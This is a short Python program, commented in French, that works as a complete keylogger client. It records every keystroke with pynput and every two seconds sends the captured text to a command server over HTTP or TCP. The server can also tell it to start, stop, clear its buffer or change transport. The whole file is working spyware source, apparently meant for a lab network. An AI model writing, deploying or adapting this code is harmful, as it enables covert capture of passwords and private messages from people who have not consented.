import pynput.keyboard
import threading
import requests
import uuid
import socket

# --- CONFIGURATION (A CHANGER SELON TON RESEAU) ---
SERVER_IP = "192.168.10.10"
SERVER_PORT_HTTP = 5000
SERVER_PORT_TCP = 9000
SERVER_URL = f"http://{SERVER_IP}:{SERVER_PORT_HTTP}/upload"

MY_UUID = str(uuid.uuid4())[:8]
log_buffer = ""
is_running = True 
exfiltration_mode = "http"

print(f"[*] CLIENT ACTIF - ID: {MY_UUID}")

def on_press(key):
    global log_buffer
    if not is_running: return
    try:
        if hasattr(key, 'char') and key.char: log_buffer += key.char
        else:
            if key == key.space: log_buffer += " "
            elif key == key.enter: log_buffer += "[ENTRER]"
            elif key == key.backspace: log_buffer += "[DEL]"
    except: pass

def send_via_tcp(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT_TCP))
        s.send(f"{MY_UUID}:{data}".encode())
        s.close()
        return True
    except: return False

def heartbeat():
    global log_buffer, is_running, exfiltration_mode
    
    # 1. EXFILTRATION
    if log_buffer:
        if exfiltration_mode == "http":
            try:
                requests.post(SERVER_URL, json={"uuid": MY_UUID, "keys": log_buffer}, timeout=2)
                log_buffer = ""
            except: pass
        elif exfiltration_mode == "tcp":
            if send_via_tcp(log_buffer): log_buffer = ""

    # 2. HEARTBEAT & COMMANDES
    try:
        r = requests.post(SERVER_URL, json={"uuid": MY_UUID}, timeout=2)
        cmd = r.json().get("command", "")
        
        if cmd == "stop" and is_running: is_running = False
        elif cmd == "start" and not is_running: is_running = True
        elif cmd == "flush": log_buffer = ""
        elif cmd == "switch_tcp": exfiltration_mode = "tcp"
        elif cmd == "switch_http": exfiltration_mode = "http"
    except: pass

    threading.Timer(2, heartbeat).start()

heartbeat()
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
